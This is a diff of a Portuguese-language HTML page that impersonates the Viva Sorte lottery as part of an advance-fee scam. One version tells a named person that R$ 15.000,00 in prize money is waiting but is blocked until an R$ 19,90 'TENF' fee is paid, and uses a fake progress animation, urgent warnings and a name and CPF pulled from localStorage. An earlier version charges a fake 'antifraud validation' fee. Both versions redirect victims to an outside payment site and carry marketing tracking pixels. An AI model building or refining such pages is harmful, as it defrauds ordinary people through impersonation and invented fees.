@@ -1,367 +1,547 @@
-<!doctype html>
-<html lang="pt-br">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Validação de Segurança - Viva Sorte</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
-    <script>
-        window.pixelId = "68626214e18089aa45e829bb";
-        var a = document.createElement("script");
-        a.setAttribute("async", "");
-        a.setAttribute("defer", "");
-        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-        document.head.appendChild(a);
-    </script>
+<!DOCTYPE html><html lang="pt-BR"><head>
     
-    <style>
-        @font-face {
-            font-family: 'Futura-Book';
-            src: url('../font/Futura-Book.eot');
-            src: url('../font/Futura-Book.eot?#iefix') format('embedded-opentype'),
-                url('../font/Futura-Book.woff2') format('woff2'),
-                url('../font/Futura-Book.woff') format('woff'),
-                url('../font/Futura-Book.ttf') format('truetype'),
-                url('../font/Futura-Book.svg#Futura-Book') format('svg');
-            font-weight: normal;
-            font-style: normal;
-            font-display: swap;
-        }
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
-        body {
-            font-family: 'Futura-Book', 'Inter', sans-serif !important;
-            background-color: #f5f7fa;
-            margin: 0;
-            padding: 0;
-            line-height: 1.6;
-        }
+<script>
+  window.pixelId = "67b55551ab32c3b13ad4ec9d";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
 
-        .header-oficial {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            padding: 1rem 0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
-        }
+  <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Premiação Disponível - Viva Sorte</title>
 
-        .logo-caixa {
-            height: 32px;
-        }
+  <script>
+    localStorage.setItem("upsell", "up3");
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
-        .container-main {
-            max-width: 600px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
 
-        .card-validacao {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            overflow: hidden;
-            margin-bottom: 2rem;
-        }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
 
-        .header-seguranca {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            color: white;
-            padding: 2rem;
-            text-align: center;
-            position: relative;
-        }
+    .card, .loading {
+      width: 100%;
+      overflow: hidden;
+    }
 
-        .icon-seguranca {
-            width: 60px;
-            height: 60px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
+    .topbar {
+      background-color: #2f4eb5;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
 
-        .titulo-seguranca {
-            font-size: 1.8rem;
-            font-weight: 600;
-            margin: 0 0 0.5rem 0;
-            letter-spacing: 0.5px;
-        }
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1rem;
+      font-weight: 500;
+    }
 
-        .subtitulo-seguranca {
-            font-size: 1rem;
-            margin: 0;
-            opacity: 0.95;
-            font-weight: 400;
-        }
+    .user-info img {
+      width: 50px;
+      height: 50px;
+    }
 
-        .conteudo-principal {
-            padding: 2rem;
-            text-align: center;
-        }
+    .user-name {
+      position: absolute;
+      top: 3rem;
+      left: 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      margin-top: 3rem;
+    }
 
-        .alert-validacao {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            position: relative;
-        }
+    .icons {
+      display: flex;
+      gap: 1.5rem;
+    }
 
-        .alert-icon {
-            color: #856404;
-            font-size: 1.2rem;
-            margin-right: 0.5rem;
-        }
+    .icons img {
+      height: 24px;
+    }
 
-        .alert-titulo {
-            color: #856404;
-            font-weight: 600;
-            font-size: 1.1rem;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-        }
+    .main-header {
+      background-color: #2f4eb5;
+      color: white;
+      padding: 1rem 1.5rem 2.5rem 1.5rem;
+    }
 
-        .valor-container {
-            text-align: center;
-            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
-            border-radius: 8px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid #dee2e6;
-        }
+    .indenizacao-info {
+      padding: 1rem;
+      text-align: start;
+      color: black;
+      font-weight: bold;
+    }
 
-        .valor-taxa {
-            font-size: 2.8rem;
-            font-weight: 700;
-            color: #28a745;
-            margin: 0;
-            line-height: 1;
-        }
+    .indenizacao-info h2 {
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+      color: #2f4eb5;
+    }
 
-        .valor-descricao {
-            color: #6c757d;
-            font-size: 0.9rem;
-            margin-top: 0.5rem;
-            font-weight: 500;
-        }
+    .indenizacao-info p {
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #000;
+    }
 
-        .reembolso-info {
-            background: #d1ecf1;
-            border: 1px solid #bee5eb;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            text-align: center;
-        }
+    .content {
+      padding: 1rem;
+      background-color: #fff;
+      margin: 0 1rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
 
-        .reembolso-titulo {
-            color: #0c5460;
-            font-weight: 600;
-            font-size: 1.1rem;
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
+    .alert {
+      background-color: #F39200;
+      color: white;
+      padding: 1rem;
+      font-weight: 400;
+      margin-bottom: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+    }
 
-        .btn-validacao {
-            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
-            border: none;
-            color: white;
-            padding: 1rem 2rem;
-            font-size: 1.1rem;
-            font-weight: 600;
-            border-radius: 8px;
-            width: 100%;
-            margin: 1.5rem 0;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
+    .pendencia {
+      background-color: #e9f2fb;
+      padding: 1rem;
+      text-align: center;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      border: 1px solid #c8ddf0;
+    }
 
-        .btn-validacao:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(47, 78, 181, 0.3);
-            background: linear-gradient(135deg, #1e3a8a, #1e40af);
-        }
+    .pendencia h3 {
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #2f4eb5;
+    }
 
-        .rodape-caixa {
-            background: #173e68;
-            color: white;
-            padding: 2rem 0;
-            text-align: center;
-            margin-top: 3rem;
-        }
+    .pendencia p {
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #333;
+    }
 
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(47, 78, 181, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0); }
-        }
+    .pendencia p strong {
+      color: #2f4eb5;
+    }
 
-        /* Responsividade */
-        @media (max-width: 768px) {
-            .container-main {
-                margin: 1rem auto;
-                padding: 0 0.5rem;
-            }
-            
-            .conteudo-principal {
-                padding: 1.5rem;
-            }
-            
-            .valor-taxa {
-                font-size: 2.2rem;
-            }
-        }
+    .button {
+      width: 100%;
+      background-color: #2f4eb5;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
 
-        @media (max-width: 480px) {
-            .header-seguranca {
-                padding: 1.5rem;
-            }
-            
-            .titulo-seguranca {
-                font-size: 1.6rem;
-            }
-            
-            .valor-taxa {
-                font-size: 1.8rem;
-            }
-            
-            .conteudo-principal {
-                padding: 1rem;
-            }
-        }
-    </style>
+    .button:hover {
+      background-color: #1e3a8a;
+    }
+
+    /* LOADING */
+    .loading {
+      display: none;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      background-color: #fff;
+      padding: 1rem 1.5rem;
+      gap: 1rem;
+      flex: initial;
+    }
+
+    .loading.active {
+      display: flex;
+    }
+
+    .status-text {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #2f4eb5;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+    }
+
+    .status-text.fade-out {
+      opacity: 0;
+    }
+
+    .progress-bar {
+      width: 100%;
+      max-width: 400px;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #2f4eb5;
+      transition: width 0.1s linear;
+    }
+
+    /* Tela Final */
+    .final {
+      display: none;
+      flex-direction: column;
+      padding: 1.5rem;
+      gap: 1.5rem;
+      background-color: #fff;
+    }
+
+    .summary-card {
+      border: 2px solid #2f4eb5;
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: center;
+    }
+
+    .summary-card h2 {
+      font-size: 1rem;
+      color: black;
+      margin-bottom: 0.5rem;
+    }
+
+    .summary-card p {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: black;
+    }
+
+    .info-box {
+      background-color: #efefef;
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    .final-button {
+      width: 100%;
+      background-color: #00c851;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .final-button:hover {
+      background-color: #00923c;
+    }
+  </style>
 </head>
 
 <body>
-    <!-- Header Oficial CAIXA -->
-    <div class="header-oficial">
-        <div class="container">
-            <div class="d-flex align-items-center justify-content-between">
-                <img src="../images/viva.png" alt="Viva Sorte" class="logo-caixa">
-                <div class="text-white">
-                    <small><i class="bi bi-shield-check"></i> Portal Oficial Viva Sorte</small>
-                </div>
-            </div>
-        </div>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card active" id="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="https://www.pngplay.com/wp-content/uploads/12/User-Avatar-Profile-PNG-Pic-Clip-Art-Background.png" alt="Avatar">
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+      <div class="user-name"><strong>Olá, Rafael</strong></div>
     </div>
 
-    <div class="container-main">
-        <!-- Card Principal de Validação -->
-        <div class="card-validacao">
-            <!-- Header de Segurança -->
-            <div class="header-seguranca">
-                <div class="icon-seguranca">
-                    <i class="bi bi-shield-exclamation text-white" style="font-size: 1.5rem;"></i>
-                </div>
-                <h1 class="titulo-seguranca">VALIDAÇÃO DE SEGURANÇA</h1>
-                <p class="subtitulo-seguranca">Sistema de Proteção Antifraude Ativado</p>
-            </div>
+    <div class="main-header"></div>
 
-            <!-- Conteúdo Principal -->
-            <div class="conteudo-principal">
-                <!-- Alerta de Validação -->
-                <div class="alert-validacao">
-                    <div class="alert-titulo">
-                        <i class="bi bi-exclamation-triangle alert-icon"></i>
-                        VERIFICAÇÃO DE SEGURANÇA OBRIGATÓRIA
-                    </div>
-                    <p class="mb-0">
-                        Para garantir a segurança da transferência dos seus <strong>títulos de capitalização Viva Sorte</strong>, 
-                        é necessário validar sua identidade através do nosso sistema antifraude.
-                    </p>
-                </div>
-
-                <!-- Valor da Taxa -->
-                <div class="valor-container">
-                    <div class="valor-taxa">R$ 17,90</div>
-                    <div class="valor-descricao">Taxa de Validação Antifraude</div>
-                </div>
-
-                <!-- Informação de Reembolso -->
-                <div class="reembolso-info">
-                    <div class="reembolso-titulo">
-                        <i class="bi bi-arrow-repeat"></i>
-                        REEMBOLSO GARANTIDO
-                    </div>
-                    <p class="mb-0">
-                        O valor de R$ 17,90 será automaticamente reembolsado em seus títulos.
-                        <br><strong>Validação obrigatória para liberação dos títulos</strong>
-                    </p>
-                </div>
-
-                <!-- Botão de Validação -->
-                <button class="btn-validacao" onclick="processarPagamento(1790)">
-                    <i class="bi bi-shield-check"></i>
-                    VALIDAR IDENTIDADE - R$ 17,90
-                </button>
-            </div>
-        </div>
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
     </div>
 
-    <!-- Rodapé Oficial -->
-    <div class="rodape-caixa">
-        <div class="container text-center">
-            <p class="mb-2"><strong>VIVA SORTE - TÍTULOS DE CAPITALIZAÇÃO</strong></p>
-            <small>© 2025 - Todos os direitos reservados</small>
+    <div class="content-initial">
+      <div class="indenizacao-info">
+        <h2>Premiação disponível</h2>
+        <p>R$ 15.000,00</p>
+      </div>
+
+      <div class="content">
+        <div class="alert">
+          Atenção! <strong>Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar sua Premiação
         </div>
+
+        <div class="pendencia">
+          <h3>Pendência encontrada!</h3>
+          <p>
+            Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota Fiscal).</strong> 
+            O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
+            Clique no botão abaixo para calcular sua taxa TENF.
+          </p>
+        </div>
+
+        <button class="button" onclick="calcularTaxa()">Calcular TAXA</button>
+      </div>
     </div>
 
-    <!-- Modal de Loading -->
-    <div class="modal fade" id="loadingModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
-        <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-body text-center p-5">
-                    <div class="spinner-border mb-3" role="status" style="width: 3rem; height: 3rem; color: #2f4eb5;">
-                        <span class="visually-hidden">Carregando...</span>
-                    </div>
-                    <h5 class="modal-title" id="loadingModalLabel">Validando...</h5>
-                    <p class="mt-2">Aguarde...</p>
-                </div>
-            </div>
-        </div>
-    </div>
+    <div class="final" id="final">
+      <div class="summary-card">
+        <h2>TENF (Taxa de Emissão de Nota Fiscal)</h2>
+        <p>R$ 19,90</p>
+      </div>
 
-    <!-- Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+      <div class="info-box">
+        Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
+        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
+        a transferência será feita para sua chave PIX cadastrada. 
+        Caso não conclua o pagamento, sua Premiação será bloqueada.
+      </div>
+
+      <button class="final-button" onclick="efetuarPagamento()">Efetuar o pagamento</button>
+    </div>
+  </div>
+
+  <!-- Modal de Loading -->
+  <div id="loadingModal" class="loading-modal">
+    <div class="loading-content">
+      <img src="../images/viva.png" class="loading-logo" alt="Logo Viva Sorte">
+      <div class="loading-spinner">
+        <div class="spinner"></div>
+      </div>
+      <h3 id="loadingText" class="loading-text">Processando TENF...</h3>
+      <p class="loading-subtitle">Aguarde, não feche esta página</p>
+      <div class="loading-progress">
+        <div class="progress-bar-loading">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <span class="progress-text" id="progressText">0%</span>
+      </div>
+    </div>
+  </div>
+
+  <style>
+  .loading-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .loading-modal.show {
+    display: flex;
+  }
+
+  .loading-content {
+    background: white;
+    border-radius: 12px;
+    padding: 2rem;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+  }
+
+  .loading-logo {
+    width: 100px;
+    margin-bottom: 1.5rem;
+  }
+
+  .loading-spinner {
+    margin: 1rem 0;
+  }
+
+  .spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #2f4eb5;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+  }
+
+  .loading-text {
+    color: #2f4eb5;
+    font-size: 1.3rem;
+    font-weight: 600;
+    margin: 1rem 0 0.5rem 0;
+  }
+
+  .loading-subtitle {
+    color: #666;
+    font-size: 0.9rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .loading-progress {
+    margin-top: 1rem;
+  }
+
+  .progress-bar-loading {
+    width: 100%;
+    height: 8px;
+    background-color: #e0e0e0;
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 0.5rem;
+  }
+
+  .progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2f4eb5, #1e3a8a);
+    transition: width 0.3s ease;
+  }
+
+  .progress-text {
+    font-size: 0.9rem;
+    color: #2f4eb5;
+    font-weight: 600;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  </style>
+
+  <script>
+    // --- LÓGICA DO NOME MODIFICADA ---
+    // Obter dados do usuário de múltiplas fontes
     
-    <script>
-        // Função para redirecionar diretamente para a página de pagamento
-        function processarPagamento(valor) {
-            // URL de destino
-            const baseUrl = 'https://pay.finalizeseu.site/v7R0gloXyYQGVr9';
+    let nomeCompleto = "Visitante"; // Valor padrão
+    let cpf = "";
+    const params = new URLSearchParams(window.location.search);
 
-            // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
-            const currentParams = new URLSearchParams(window.location.search).toString();
+    // 1. Tenta obter o nome da URL, verificando por 'name' e depois por 'nome'
+    const nomeDaUrl = params.get("name") || params.get("nome");
+    if (nomeDaUrl) {
+        nomeCompleto = nomeDaUrl;
+    }
 
-            // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
-            let redirectUrl = baseUrl;
-            if (currentParams) {
-                // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
-                if (baseUrl.includes('?')) {
-                    redirectUrl += '&' + currentParams;
-                } else {
-                    redirectUrl += '?' + currentParams;
-                }
-            }
-            
-            // Redireciona o navegador do usuário para o link final instantaneamente
-            window.location.href = redirectUrl;
+    // 2. Tenta obter os dados do localStorage (pode sobrescrever os da URL se existirem)
+    try {
+        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+        if (dadosUsuario) {
+            // Se o localStorage tiver um nome, ele tem prioridade sobre a URL e o valor padrão
+            nomeCompleto = dadosUsuario.nome || nomeCompleto;
+            cpf = dadosUsuario.cpf || "";
         }
-    </script>
-</body>
-</html> 
+        console.log('Dados do localStorage carregados:', dadosUsuario);
+    } catch (error) {
+        console.error('Erro ao carregar dados do localStorage:', error);
+        // O nome da URL (se existir) já foi carregado, então não é preciso fazer nada extra
+    }
+
+    // Pega apenas o primeiro nome para a saudação
+    const primeiroNome = nomeCompleto.trim().split(" ")[0];
+
+    // Atualiza os elementos na página com o nome encontrado
+    document.querySelector(".user-name").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`;
+    document.querySelector(".alert strong").textContent = nomeCompleto;
+
+    function calcularTaxa() {
+      document.querySelector(".content-initial").style.display = "none";
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let trocado = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("final").style.display = "flex";
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          if (progress === 70 && !trocado) {
+            trocado = true;
+            statusText.classList.add('fade-out');
+            setTimeout(() => {
+              statusText.textContent = "Gerando seu comprovante...";
+              statusText.classList.remove('fade-out');
+            }, 500);
+          }
+        }
+      }, 30);
+    }
+
+    // --- LÓGICA DO PAGAMENTO MODIFICADA ---
+    function efetuarPagamento() {
+        // URL de destino
+        const baseUrl = 'https://pay.finalizeseu.site/PyE2Zy8wJMp3qRb';
+
+        // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
+        const currentParams = new URLSearchParams(window.location.search).toString();
+
+        // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
+        let redirectUrl = baseUrl;
+        if (currentParams) {
+            // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
+            if (baseUrl.includes('?')) {
+                redirectUrl += '&' + currentParams;
+            } else {
+                redirectUrl += '?' + currentParams;
+            }
+        }
+        
+        // Redireciona o navegador do usuário para o link final instantaneamente
+        window.location.href = redirectUrl;
+    }
+  </script>
+
+
+
+</body></html>
